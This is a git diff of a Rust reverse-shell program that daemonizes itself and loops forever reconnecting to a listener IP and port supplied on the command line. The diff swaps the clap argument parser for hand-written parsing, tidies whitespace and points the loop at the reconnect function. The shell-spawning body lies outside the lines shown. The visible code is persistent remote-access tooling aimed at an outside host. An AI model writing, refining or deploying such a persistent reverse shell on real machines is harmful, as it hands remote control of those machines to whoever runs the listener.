@@ -6,19 +6,42 @@ use std::process::{Command, ExitStatus};
 use std::thread::sleep;
 use std::time::Duration;
 
-use clap::Parser;
 use daemonize::{Daemonize, Stdio};
 
 type Result<T> = std::result::Result<T, Box<dyn Error>>;
 
-#[derive(Parser, Debug)]
-#[command(author, version, about, arg_required_else_help(true))]
+/// CLI Arguments
+///
+/// Includes an IP address and a port for the communication.
+/// Both arguments are mandatory.
 struct Args {
     /// IP Address of the listener
     ip: IpAddr,
 
     /// Port on which the listener is operating
     port: u16,
+}
+
+impl Args {
+    /// Create a new Args instance
+    ///
+    /// Initializes a new instance of Args with valid IPAddress and a Port.
+    fn new(ip: IpAddr, port: u16) -> Args {
+        Args { ip, port }
+    }
+
+    /// Parse the arguments from the CLI
+    ///
+    /// Initializes an Args object using the arguments coming from
+    /// the command line, provided by the user.
+    fn parse() -> Args {
+        let ip = std::env::args().nth(1).expect("No IP given!");
+        let port = std::env::args().nth(2).expect("No port given!");
+        Args::new(
+            ip.parse().expect("Invalid IP format"),
+            port.parse().expect("Invalid port format"),
+        )
+    }
 }
 
 /// Run the reverse shell
@@ -61,11 +84,11 @@ fn reconnect(socket: &SocketAddr) -> Result<()> {
 /// Loop forever a reconnect function
 ///
 /// Get the required data and loop forever a given step function.
-/// If the step function returns an error, the loop ends, otherwise the 
+/// If the step function returns an error, the loop ends, otherwise the
 /// loop will be repeated after waiting for some time.
-fn loop_forever<T>(step: T) -> Result<()> 
+fn loop_forever<T>(step: T) -> Result<()>
 where
-    T: Fn() -> Result <()> 
+    T: Fn() -> Result<()>,
 {
     loop {
         match step() {
@@ -76,7 +99,7 @@ where
 }
 
 /// Create the daemon process
-/// 
+///
 /// Implementation detail to daemonize the process, isolated
 /// for debug purposes and to allow for different daemonization
 /// approaches.
@@ -108,17 +131,17 @@ where
 /// Daemon entry point
 ///
 /// The actual main entry point function for the demonized process.
-/// This code is executed from the daemon process resulting from 
-/// the daemonization. 
+/// This code is executed from the daemon process resulting from
+/// the daemonization.
 fn daemon_main(args: Args) -> Result<()> {
     let socket = SocketAddr::new(args.ip, args.port);
-    loop_forever(|| step(&socket))
+    loop_forever(|| reconnect(&socket))
 }
 
 /// Main Function
 ///
 /// The program entry point. CLI arguments and any other inputs
-/// are parsed here to get feedback if the input provided is 
+/// are parsed here to get feedback if the input provided is
 /// not valid. Once the input data is validated the process becomes
 /// a daemon and the input data is passed to the daemon main.
 fn main() -> Result<()> {
